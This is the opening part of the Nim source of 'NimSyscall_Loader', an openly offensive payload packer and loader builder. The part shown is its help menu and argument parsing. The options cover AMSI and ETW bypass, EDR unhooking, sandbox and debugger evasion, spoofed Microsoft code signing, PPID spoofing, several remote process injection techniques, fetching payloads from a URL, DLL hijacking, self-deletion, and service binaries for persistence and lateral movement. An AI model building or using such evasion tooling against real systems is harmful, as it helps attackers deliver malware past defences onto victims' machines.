#[

    Author: Fabian Mosch, Twitter: @ShitSecure
    Inspiration from: https://github.com/icyguider/nimcrypt/blob/main/nimcrypt.nim
]#

import nimcrypto
import nimcrypto/sysrand
import strformat
import strutils
import sugar
import os
import osproc
import docopt
import random
import winim
#import std/algorithm
import streams
#import ptr_math
when system.hostOS == "windows":
    import winim/clr except `[]`

import HellsgateStubs
import CustomEvasionStubs
import GetSyscallStubs
import SandboxStubs
import Whispers
import SleepyCryptSleep
import PELoad
import CurrentProcInject
import RemoteProcInject
import DInvoke
import Powershell
import Csharp
import AntiDebug


#from system import io

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc rndStr(length: int): string =
  for _ in .. length:
    add(result, char(rand(int('a') .. int('z'))))

# When this function isn't called, all random functions are not random. (https://nim-lang.org/docs/random.html)
randomize()

const largePayloadThreshold = 5 * 1024 * 1024


let banner = """
    _   ___          _____                       ____     __                    __         
   / | / (_)___ ___ / ___/__  ________________ _/ / /    / /   ____  ____ _____/ /__  _____
  /  |/ / / __ `__ \\__ \/ / / / ___/ ___/ __ `/ / /    / /   / __ \/ __ `/ __  / _ \/ ___/
 / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                       /____/                   /_____/      --> @ShitSecure
                                                                 v2.2                                            

"""

echo banner

#Handle arguments

let helpmenu = """
NimSyscall_Loader v 2.2

Usage:
  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --execute-if=<procname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --ClrPatch --amsihwbp --etwhwbp --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:

[general]

  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
    --keyfile keyfile  File to read key from
    --dnsKey    Use remote DNS TXT Record as key which is retrieved on runtime
      --dnsdomain sub.example.com    Specify a subdomain to use for the DNS TXT Record
  --environmentalKey value    Use environmental key (domain,username) to encrypt with
                              domain -> enumerate the current domain on runtime and use that as key
                              username -> enumerate the current username on runtime and use that as key
  --execute-if procname    Execute the payload only, if the DLL is loaded from the defined process name. Or for executables if the exectable wasn't renamed.
  --killdate yyyymmdd    Specify an date, after which the payload won't get executed anymore
  --output filename    Filename for encrypted exe/dll
  --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
  --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
  --noETW    Don't bypass ETW data collection
  --noAMSI    Don't bypass AMSI
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --debug    Compiles the binary in debug mode
  --x86    Compiles an x86 binary
  --wow64    (Compiles a x86 binary that can be used by x64 CPUs)
  --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
  --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
  --verbose    Prints output to the console (for troubleshooting purposes)
  --psout    Powershell Output format, reflectively loading the packed binary
    --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
    --pslyrics    Add Lyrics as comments to avoid some more detections
  --csout    C# Output format, reflectively loading the packed binary
  --scout    Shellcode Output format, reflectively loading the packed binary via donut
  --sourceonly    Dont compile but just create the source code and compile command
  --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
  --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
  --stegofile filepath    Path to a .bmp or jpeg file in which the encrypted payload will be embedded

[Payload retrieval options]

  By default, the Loader will embed the Payload into the output file. There are two alternatives to this:  
  --shellcodeFile shellcodefileLocation(s)    Filename to retrieve Payload from - on Runtime (No embedding). The first location will also be the output file location. You can specify multiple locations, separated by a comma.
  --shellcodeURL shellcodeURL    URL to retrieve Payload from

[DLL options]

  --dll     Generate DLL instead of an executable
      --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
      --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
      --perfectdllhijack    Add DllMain and execute the Payload via "Perfect DLL Hijacking" to avoid LoaderLock issues (https://elliotonsecurity.com/perfect-dll-hijacking/)
      --noNimMain    Remove NimMain export to avoid this IoC (Use "--dllhijack" in addition to instead export DllMain or alternatively "--dllexportfunc DllMain")
      --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
      --mutexoneshot    Use a Mutex to ensure the payload is only executed once per process tree
      --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
          --payloadFunction funcName    The function to execute the Payload with to not use DllMain
          --noRandom    Don't randomize the DLL-Name but forward to the original DLL instead (No need to copy the original DLL, only works for builtin windows DLLs)
      --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
      --xll    Generate an XLL file (Excel Add-In) instead of an executable

[evasion]

  --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
  --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --unhook value    Unhook the specified DLL before doing anything else for the current process
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
  --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
  --sgn    Encode shellcode via SGN before encrypting it
  --replace    Replace common nim IoC's in the loader like the string 'nim'
  --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
  --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
  --PatchETW    Bypass ETW by patching ntdll.dll/NtTraceEvent via Syscalls
  --ClrPatch    Patch the CLR to bypass AMSI
  --amsihwbp    Use Hardware Breakpoints to bypass AMSI
  --etwhwbp    Use Hardware Breakpoints to bypass ETW (deprecated, unstable now)
  --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
  --sandbox value    Include Sandbox Checks of your choice into the loader:
                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                     DiskSpace -> Only execute if c:\ disk space >= 200GB
                     MemorySpace -> Only execute if more than 4GB RAM available
                     Emulated -> VirtualAllocExNuma API call (Some sandboxes do not emulate that)
                     WindowChanges -> Checks, if the current Window has changed 7 or more times before executing the payload
        --domain targetdomain    Specify a domain for SandBox Evasion
  --pump value    Pump the file with:
                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
  --sign    Sign the binary with a spoofed certificate
      --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
  --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
  --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
  --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                 This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
  --noAntidebug    Leave out AntiDebugger Checks
  --noDefaultSandBox    Leave out default Sandbox Checks
  --noAntiEmulate    Leave out AntiEmulation Checks
  --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
    --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
    --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
  --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loaded into the local or newly spawned process. (Doesnt work for injection into existing processes)

[Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]

  --hellsgate    Retrieve Syscalls via Hellsgate technique
  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
        --jump    When using Syswhispers3, use the jumper_randomized technique

[shellcode specific]

  --shellcode    Encrypt shellcode to load it on runtime
  --dripallocate    Allocate memory Driploader style (multiple small memory chunks after another to avoid memory scans after ETWti/Kernel Callback triggers)
      --dripsleep 500    Sleep time in ms between each memory allocation (e.G. 500 milisec)
  --CallbackExecute    Execute shellcode via a custom Callback function
  --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
  --QueueApc    Instead of a direct Pointer or Thread Creation execute the Shellcode via NtQueueApcThread
  --noWait    Don't use 'WaitForSingleObject(-1,-1)' after local Injection but exit the process instead afterwards. If your Shellcode exits the Thread/Process itself, this will not have any effect.
  --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
      --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
      --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                         Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
      --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
      --parentProcess parentProcName    Name of the parent Process to spoof (PPID Spoofing)
      --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
      --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
      --remotepatchETW    Patch ETW in the remote process before shellcode execution
  --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
  --threadlessthread    Use Threadless inject but the trampoline will create a thread instead of CALL to the target address (no impact on the target process but additional IoC)
      --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
      --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
  --poolparty number    Use Poolparty technique 1,2,3,4 for execution
  --conhostinject    Inject into a remote conhost.exe process and trigger execution without Thread or APC or similar
  --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
  --Caro-Kann-Thread   Same as Caro-Kann, but the Shellcode will not do a direct JMP but instead create a Thread on the start address 
  --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
      --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
      --stombFunc dllfunc    Specify a function to use for the Module Stomping
      --stombFunc2 dllfunc2    Specify a second function to use for the Module Stomping. Only needed if you combine Caro-Kann with Module Stomping as there are two shellcodes than
      --restore    Using this option will restore the .text section of the stomped DLL after executing the shellcode. That way, you get rid of Module Stomp IoCs. But this option only works with Payloads, that are reflective DLLs or which create a new thread.

[PE Packing]

  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE

[C# assembly Packing]

  --csharp    Encrypt a C# assembly to load it on runtime
  --interactivePS    Load an interactive unmanaged Powershell Runspace

"""

if (paramCount() == 0):
    echo helpmenu
    quit(0)
if (paramStr(1) == "-h"):
    echo helpmenu
    quit(0)

proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))

proc rndSpecial(no: int): string =
    for _ in 0.. no:
      add(result, char(rand(int('!') .. int('/'))))

var 
    filename: string = ""
    packerPath = os.getAppDir()
    outfile: string = packerPath
    envkey: string = rndStr(rand(10..35))
    usekeyFile: bool = false
    usednsKey: bool = false
    webKey: bool = false
    dll_out: bool = false
    dllfunc: string = ""
    execute_in_proc: bool = false
    execute_in: string = ""
    dllexportfunctions: seq[string]
    dllNames: seq[string]
    unDlls: string = ""
    dllhijack: bool = false
    perfectdllhijack: bool = false
    dllclone: bool = false
    dllToClone: string = ""
    dllProxy: bool = false
    noNimMain: bool = false
    psout: bool = false
    csout: bool = false
    scout: bool = false
    uselyrics: bool = false
    psobfs: bool = false
    cpl: bool = false
    xll: bool = false
    replaceNimMain: bool = false
    big: bool
    sourceonly: bool = false
    service: bool = false
    ruylopez: bool = false
    remoteprocesses : seq[string]
    existingprocessInjection: bool = false
    targetdomain : string = ""
    processname: string = ""
    customspawnprocess: string = "RuntimeBroker.exe"
    parentProcess: string = ""
    spoofArgs: string = ""
    randomArgs: int = rand(1 .. 100)
    shellcodeFile: seq[string] = @["enc.blob"]
    keyFile: seq[string] = @["key.txt"]
    kfile: string = ""
    dnsdomain: string = ""
    customKey: bool = false
    environmentalKey: bool = false
    killdate: string = ""
    environmentalDomain: bool = false
    environmentalUsername: bool = false
    environmentalcheckfmt: string = ""
    stegofile: string = ""
    useStego: bool = false
    stFile: string = ""
    scfile: string = ""
    retrieveFromFile: bool = false
    shellcodeURL: string = ""
    retrieveFromURL: bool = false
    sandboxcheckfmt: string = ""
    sandboxchecks: seq[string]
    sandbox: bool = false
    csharp: bool = false
    interactivePS: bool = false
    arguments: string = ""
    embeddedArguments : bool = false
    AMSI: bool = false
    oneShot: bool = true
    AMSIPatch: bool = false
    ClrPatch: bool = false
    AMSIProviderPatch: bool = true
    AMSICreateSectionHook: bool = false
    ETW: bool = false
    ETWEATHook: bool = true
    ETWPatch: bool = false
    COMVARETW: bool = false
    shellcode: bool = true
    RWX: bool = false
    callbackexecute: bool = false
    wait: bool = true
    localCreateThread: bool = false
    localinject: bool = true
    unhook: bool = false
    verbose: bool = false
    blockDLLs: bool = false
    denim: bool = false
    llvm: bool = false
    gosleep: bool = false
    sleeptime: int = 0
    sleepinbetween: int = 0
    dripsleepinbetween: int = 0
    reflective: bool = false
    hide: bool = false
    apiHide: bool = false
    noArgs: bool = false
    peinject: bool = false
    peload: bool = false
    callobfs: bool = false
    hellsgate: bool = false
    syswhispers: bool = false
    jump: bool = false
    sgn: bool = false
    getfreshstub: bool = true
    selfdelete: bool = false
    remoteAMSIpatch: bool = false
    remoteETWpatch: bool = false
    replace: bool = false
    useQueueAPC: bool = false
    macPayloadString: string
    pump: bool = false
    pumpfmt: string = ""
    pumpargs: seq[string]
    debugMode: bool = false
    sign: bool = false
    signdomain: string = "www.microsoft.com"
    compileX86: bool = false
    wow64: bool = false
    noassembly: bool = false
    sleepycrypt: bool = false
    fluctuate: bool = false
    noDInvoke: bool = false
    metadata: bool = false
    antidebug: bool = true
    macPayload: bool = false
    defaultSandBoxChecks: bool = true
    remoteMapSection: bool = false
    remoteinject: bool = false
    jmpEntry: bool = false
    jmpEntryDLL: string = "ntdll.dll"
    jmpEntryFunction: string = "RtlpWow64CtxFromAmd64"
    dripallocate: bool = false
    threadless: bool = false
    threadlessthread: bool = false
    threadlessDll: string = "ntdll.dll"
    threadlessFunc: string = "NtWaitForMultipleObjects" # called regularly by RuntimeBroker.exe which is default spawn inject target.
    suspended: bool = true
    carokann: bool = false
    carokannthread: bool = false
    stomb: bool = false
    stombDll: string = "chakra.dll"
    stombFunc: string = "DllCanUnloadNow" # 
    stombFunc2: string = "MemProtectHeapUnprotectCurrentThread" # this combi works for client and server
    restore: bool = false
    noAntiEmulate: bool = false
    poolparty: int = 1
    usepoolparty: bool = false
    conhostinject: bool = false
    noRandom: bool = false
    mutexoneshot: bool = false
    payloadFunction: string = ""

let args = docopt(helpmenu, version = "NimSyscall_Loader 2.2")

if args["--file"]:
  let fname = args["--file"]
  filename = fmt"{fname}"
  echo filename

if args["--environmentalKey"]:
  if(customKey == false):
    echo "You need to specify the environmental value (domain or username or both) via the --key parameter, otherwise the payload cannot get encrypted via that!"
    quit(0)
  environmentalKey = true
  let environmentalArgs = args["--environmentalKey"]
  environmentalcheckfmt = fmt"{environmentalArgs}"
  sandboxchecks = environmentalcheckfmt.split(',')
  for m in sandboxchecks:
    if(m.contains("domain")):
      environmentalDomain = true
    if(m.contains("username")):
      environmentalUsername = true

if args["--killdate"]:
  let killdatestring = args["--killdate"]
  killdate = fmt"{killdatestring}"

if args["--key"]:
  let keyname = args["--key"]
  envkey = fmt"{keyname}"
  customKey = true
  # if environmentalDomain or environmentalUsername is true, make the key lowercase
  if(environmentalKey):
    envkey = envkey.toLower()

if args["--stegofile"]:
    useStego = true
    let stegoFileString = args["--stegofile"]
    stfile = fmt"{stegoFileString}"
    echo stfile
    if(stfile.contains("http")):
        retrieveFromURL = true
    stegofile = stfile
    echo "Stego file: " & stegofile

if args["--ruy-lopez"]:
    ruylopez = true

if args["--noDefaultSandBox"]:
    defaultSandBoxChecks = false

if args["--noAntiEmulate"]:
    noAntiEmulate = true

if args["--psout"]:
    psout = true
    reflective = true

if args["--csout"]:
    csout = true
    reflective = true

if args["--scout"]:
    scout = true
    reflective = true
    # disable antidebug, as this leads to problems in shellcode
    antidebug = false

if args["--psobfs"]:
    psobfs = true

if args["--pslyrics"]:
    uselyrics = true

if args["--sourceonly"]:
    sourceonly = true

if args["--arguments"]:
  let argsForPE = args["--arguments"]
  arguments = fmt"{argsForPE}"
  embeddedArguments = true

if args["--shellcode"]:
  shellcode = true
  csharp = false
  peload = false

if args["--RWX"]:
  RWX = true

if args["--CallbackExecute"]:
  callbackexecute = true

if args["--localCreateThread"]:
    localCreateThread = true

if args["--QueueApc"]:
    useQueueAPC = true
    localCreateThread = false

if args["--noWait"]:
    wait = false

if args["--jmpEntry"]:
    jmpEntry = true

if args["--jmpEntryDLL"]:
    let dllname = args["--jmpEntryDLL"]
    jmpEntryDLL = fmt"{dllname}"

if args["--jmpEntryFunc"]:
    let funcname = args["--jmpEntryFunc"]
    jmpEntryFunction = fmt"{funcname}"

if args["--dripallocate"]:
    dripallocate = true

if args["--dripsleep"]:
    dripsleepinbetween = parse_int($args["--dripsleep"])
    dripsleepinbetween = (dripsleepinbetween)

if args["--csharp"]:
  csharp = true
  shellcode = false
  peload = false

if args["--peload"]:
  peload = true
  shellcode = false
  csharp = false

if args["--PatchAMSI"]:
  AMSIPatch = true
  AMSI = false

if args["--ClrPatch"]:
  ClrPatch = true
  AMSI = false
  AMSIPatch = false
  AMSICreateSectionHook = false
  AMSIProviderPatch = false

if args["--amsihwbp"]:
  AMSI = true

if args["--etwhwbp"]:
    ETW = true
    ETWEATHook = false
    echo "Warning: --etwhwbp is deprecated and unstable now, use --PatchETW instead"

if args["--PatchETW"]:
  ETWPatch = true
  ETW = false
  ETWEATHook = false

if args["--shellcodeFile"]:
    retrieveFromFile = true
    let shellcodeFilestring = args["--shellcodeFile"]
    scfile = fmt"{shellcodeFilestring}"
    shellcodeFile = scfile.split(',')

if args["--keyfile"]:
    usekeyFile = true
    let keyFilestring = args["--keyfile"]
    kfile = fmt"{keyFilestring}"
    keyFile = kfile.split(',')

if args["--dnsdomain"]:
    let dnsdomainstring = args["--dnsdomain"]
    dnsdomain = fmt"{dnsdomainstring}"
    usednsKey = true
    webKey = false
    usekeyFile = false

if args["--dnsKey"]:
    usednsKey = true
    webKey = false
    usekeyFile = false
    # if dnsdomain == "" quit and tell the user to specify a domain
    if(dnsdomain == ""):
        echo "Please specify a domain to retrieve the key from with --dnsdomain"
        quit(0)

if args["--shellcodeURL"]:
    retrieveFromURL = true
    shellcodeFile = @["WebserverPayload.bin"]
    let shellcodeURLstring = args["--shellcodeURL"]
    shellcodeURL = fmt"{shellcodeURLstring}"

if args["--dll"]:
  dll_out = true
  if peload == true:
    echo "Warning: Argument passing to the PE will fail as the first argument is rundll32.exe or regsvr32.exe"

if args["--dllexportfunc"]:
  let dllfuncstring = args["--dllexportfunc"]
  dllfunc = fmt"{dllfuncstring}"
  dllexportfunctions = dllfunc.split(',')

if args["--execute-if"]:
  execute_in_proc = true
  let execin = args["--execute-if"]
  execute_in = fmt"{execin}"


if args["--dllhijack"]:
  dllhijack = true
  dll_out = true

if args["--perfectdllhijack"]:
  dllhijack = true
  perfectdllhijack = true
  dll_out = true
    

if args["--dllProxy"]:
  dllProxy = true
  dllhijack = true
  dll_out = true

if args["--noRandom"]:
  noRandom = true

if args["--mutexoneshot"]:
  mutexoneshot = true

if args["--payloadFunction"]:
  let payloadFunctionString = args["--payloadFunction"]
  payloadFunction = fmt"{payloadFunctionString}"

if args["--noNimMain"]:
  noNimMain = true

if args["--clone"]:
    dllclone = true
    dll_out = true
    # NetClone will only work, when DllMain is exposed and leading to NimMain
    dllhijack = true
    let cloneDLL = args["--clone"]
    dllToClone = fmt"{cloneDLL}"

if args["--cpl"]:
  dllhijack = true
  dll_out = true
  cpl = true

if args["--xll"]:
  dllhijack = false
  dll_out = true
  xll = true
  if args["--remoteinject"]:
    wait = false
  # set dllexportfunctions to xlAutoOpen, as this is the default function for Excel Add-Ins
  dllexportfunctions = @["xlAutoOpen"]

if args["--interactivePS"]:
    csharp = true
    interactivePS = true
    shellcode = false
    peload = false

var customLoaderName: string = rndStr(rand(5..15))

when system.hostOS == "windows":
    if(dll_out):
        outfile.add(fmt"\\{customLoaderName}.dll")
    elif(cpl):
        outfile.add(fmt"\\{customLoaderName}.cpl")
    elif(xll):
        outfile.add(fmt"\\{customLoaderName}.xll")
    else:
        outfile.add(fmt"\\{customLoaderName}.exe")
else:
    if(dll_out):
        outfile.add(fmt"/{customLoaderName}.dll")
    elif(cpl):
        outfile.add(fmt"/{customLoaderName}.cpl")
    elif(xll):
        outfile.add(fmt"/{customLoaderName}.xll")
    else:
        outfile.add(fmt"/{customLoaderName}.exe")

if args["--output"]:
  let outname = args["--output"]
  outfile = fmt"{outname}"

if args["--metadata"]:
  metadata = true

if args["--remotepatchAMSI"]:
  remoteAMSIpatch = true

if args["--remotepatchETW"]:
  remoteETWpatch = true

if args["--mapSection"]:
  remoteMapSection = true

if args["--noAMSI"]:
  AMSI = false
  ClrPatch = false
  AMSICreateSectionHook = false
  AMSIProviderPatch = false

if args["--AMSIProviderPatch"]:
  AMSIProviderPatch = true
  AMSI = false

if args["--AMSINtCreateSectionHook"]:
  AMSICreateSectionHook = true
  AMSI = false
  AMSIProviderPatch = false
  ClrPatch = false

if args["--noETW"]:
  ETW = false
  COMVARETW = false

if args["--large"]:
  big = true

if args["--COMVARETW"]:
  COMVARETW = true
  ETWEATHook = false
  ETW = false

if args["--unhook"]:
  unhook = true
  let unhookdlls = args["--unhook"]
  unDlls = fmt"{unhookdlls}"
  dllNames = unDlls.split(',')

if args["--sleep"]:
  sleeptime = parse_int($args["--sleep"])
  sleeptime = (sleeptime)
  gosleep = true

if args["--sleep-in-between"]:
    sleepinbetween = parse_int($args["--sleep-in-between"])
    sleepinbetween = (sleepinbetween)
    gosleep = true
    
if args["--remoteinject"]:
  localinject = false
  remoteinject = true

if args["--blockDLLs"]:
    blockDLLs = true

if args["--customprocess"]:
  let customprocargs = args["--customprocess"]
  customspawnprocess = fmt"{customprocargs}"

if args["--spoofArgs"]:
  let customSpoofArgs = args["--spoofArgs"]
  spoofArgs = fmt"{customSpoofArgs}"

if args["--parentProcess"]:
    let parProc = args["--parentProcess"]
    parentProcess = fmt"{parProc}"

if args["--remoteprocess"]:
  let remoteprocessesstring = args["--remoteprocess"]
  processname = fmt"{remoteprocessesstring}"
  echo processname
  remoteprocesses = processname.split(',')
  echo remoteprocesses
  existingprocessInjection = true

if args["--reflective"]:
  reflective = true

if args["--obfuscate"]:
  denim = true

if args["--macPayload"]:
  macPayload = true

if args["--sign"]:
    sign = true

if args["--signdomain"]:
    let signarg = args["--signdomain"]
    signdomain = fmt"{signarg}"

if args["--llvm"]:
  llvm = true

if args["--sleepycrypt"]:
    sleepycrypt = true

if args["--fluctuate"]:
    fluctuate = true

if args["--hide"]:
  hide = true

if args["--APIhide"]:
  apihide = true
  hide = false

if args["--noArgs"]:
  noArgs = true

if args["--peinject"]:
  peinject = true

if args["--hellsgate"]:
  hellsgate = true
  getfreshstub = false

if args["--syswhispers"]:
  syswhispers = true
  getfreshstub = false

if args["--jump"]:
  syswhispers = true
  jump = true

if args["--sgn"]:
  sgn = true
  RWX = true

if args["--replace"]:
  replace = true

if args["--sandbox"]:
  sandbox = true
  let sandboxchecksargs = args["--sandbox"]
  sandboxcheckfmt = fmt"{sandboxchecksargs}"
  sandboxchecks = sandboxcheckfmt.split(',') 

if args["--pump"]:
  pump = true
  let pumptempargs = args["--pump"]
  pumpfmt = fmt"{pumptempargs}"
  pumpargs = pumpfmt.split(',') 

if args["--domain"]:
  let domainarg = args["--domain"]
  targetdomain = fmt"{domainarg}"

if args["--self-delete"]:
  selfdelete = true

if args["--obfuscatefunctions"]:
  callobfs = true

if args["--debug"]:
  debugMode = true

if args["--noAntidebug"]:
  antidebug = false

if args["--x86"]:
  compileX86 = true
  noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.

if args["--wow64"]:
    wow64 = true
    compileX86 = true
    noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.

if args["--verbose"]:
  verbose = true

if args["--service"]:
    service = true
    verbose = false

if args["--noDInvoke"]:
  noDInvoke = true

if args["--threadless"]:
    threadless = true
    if(remoteinject):
        localCreateThread = false
        useQueueAPC = false
        callbackexecute = false
    suspended = false

if args["--threadlessthread"]:
    threadless = true
    threadlessthread = true
    if(remoteinject):
        localCreateThread = false
        useQueueAPC = false
        callbackexecute = false
    suspended = false

if args["--threadlessDll"]:
    let threadlessDllarg = args["--threadlessDll"]
    threadlessDll = fmt"{threadlessDllarg}"

if args["--threadlessFunc"]:
    let threadlessFuncarg = args["--threadlessFunc"]
    threadlessFunc = fmt"{threadlessFuncarg}"

# parse number as int
if args["--poolparty"]:
    usepoolparty = true
    let poolpartyarg = args["--poolparty"]
    poolparty = parse_int($poolpartyarg)
    suspended = false

if args["--conhostinject"]:
    conhostinject = true
    remoteinject = true
    localinject = false
    existingprocessInjection = true

if args["--Caro-Kann"]:
    carokann = true

if args["--Caro-Kann-Thread"]:
    carokann = true
    carokannthread = true

if args["--stomb"]:
    stomb = true


# retrieve --stombFunc and --stombFunc2
if args["--stombFunc"]:
    let stombFuncarg = args["--stombFunc"]
    stombFunc = fmt"{stombFuncarg}"

if args["--stombFunc2"]:
    let stombFunc2arg = args["--stombFunc2"]
    stombFunc2 = fmt"{stombFunc2arg}"

if args["--restore"]:
    restore = true

var blob: string

if ((compileX86 or wow64) and hellsgate):
    echo "Error: Hellsgate is not supported for x86 yet"
    if (wow64):
        echo "Only syswhispers (without Jump) supports wow64 till now"
    quit(1)

if (wow64 and syswhispers and jump):
    echo "Error: Syswhispers (Jump) cannot be used in combination with wow64"
    quit(1)

if (wow64 and getfreshstub):
    echo "Error: GetSyscallStub cannot be used in combination with wow64 yet"
    if (wow64):
        echo "Only Syswhispers (without Jump) supports wow64 till now"
    quit(1)

if (useQueueAPC and remoteinject and syswhispers):
    echo "Error: QueueUserAPC not implemented for remote injection with Syswhispers yet. Only Hellsgate and GetSyscallStub."
    quit(1)

#if (remoteMapSection and dripallocate):
#    echo "Error: Cannot use both --mapSection and --dripallocate, not implemented yet"
#    quit(1)

# cannot use mapsection and stomb in parallel
